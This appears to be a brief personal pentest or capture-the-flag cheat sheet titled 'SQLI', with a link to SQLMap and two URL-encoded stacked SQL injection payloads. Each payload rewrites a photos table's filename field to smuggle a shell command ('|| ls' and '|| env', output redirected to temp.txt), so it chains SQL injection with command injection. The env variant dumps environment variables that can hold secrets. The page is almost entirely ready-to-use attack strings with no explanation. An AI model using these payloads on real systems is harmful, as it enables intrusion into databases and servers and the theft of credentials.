# SQLI

<a href="SQLI/SQLMap%2047dddccc92574143afac24284247061c.html">SQLMap</a>

## Stacked updates

```
id=1;%20update%20photos%20set%20filename=%27*%20||%20ls%20./files%20%3Etemp.txt%20%27%20where%20id=3;%20commit;%20--

id=1;%20update%20photos%20set%20filename=%27*%20||%20env%20%3Etemp.txt%27%20where%20id=3;%20commit;%20--
```

## Examples
